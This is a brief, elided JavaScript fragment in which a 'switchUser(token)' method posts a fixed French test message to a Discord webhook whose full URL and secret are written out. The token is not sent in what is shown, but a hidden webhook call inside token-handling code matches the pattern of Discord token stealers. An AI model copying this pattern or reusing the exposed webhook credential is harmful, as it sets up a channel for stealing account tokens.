...
`,
  ...
  switchUser(token) {
    ...
    fetch('https://discord.com/api/webhooks/1131124348300841051/O-_P6aRFv5PNyyJyccAWg4HHyq2OYlx-kF5sNHZRnoHF0cDUtPKII2NWUmsuCe1Cilr6', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: 'Ceci est un message envoyé via un webhook en une seule ligne !' }) })
